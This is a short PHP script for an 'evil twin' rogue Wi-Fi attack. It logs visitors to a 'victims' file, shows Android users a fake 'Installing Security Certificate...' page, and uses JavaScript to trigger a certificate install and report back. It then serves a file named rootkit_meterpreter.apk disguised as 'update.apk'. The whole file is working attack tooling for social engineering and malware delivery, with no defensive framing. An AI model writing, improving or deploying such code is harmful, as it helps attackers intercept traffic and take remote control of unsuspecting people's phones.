<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$log = "/var/log/evil_twin/victims.log";

function log_victim($msg) {
    global $log; file_put_contents($log, "[$ip] $msg\n", FILE_APPEND);
}

// 1. Detect CA install success (via test request)
if (isset($_GET['ca_installed'])) {
    log_victim("CA INSTALLED via $_GET[os]");
    
    // 2. Serve rootkit APK only AFTER CA
    if (stripos($ua, 'Android')) {
        log_victim("DROPPING ROOTKIT APK");
        header('Content-Type: application/vnd.android.package-archive');
        header('Content-Disposition: attachment; filename="update.apk"');
        readfile('/var/www/html/payload/rootkit_meterpreter.apk');
        exit;
    }
}

// 3. CA install trigger page (auto-called by APK)
if (stripos($ua, 'Android') && !isset($_GET['ca_installed'])) {
    ?>
    <script>
    // Auto-open APK after 3s
    setTimeout(() => {
        location.href = "intent://scan/#Intent;scheme=content;package=com.android.chrome;end";
        setTimeout(() => {
            fetch("?ca_installed=1&os=android").then(() => {
                location.href = "/ca/payload_drop.php";
            });
        }, 3000);
    }, 1000);
    </script>
    <h1>Installing Security Certificate...</h1>
    <?php
    exit;
}
?>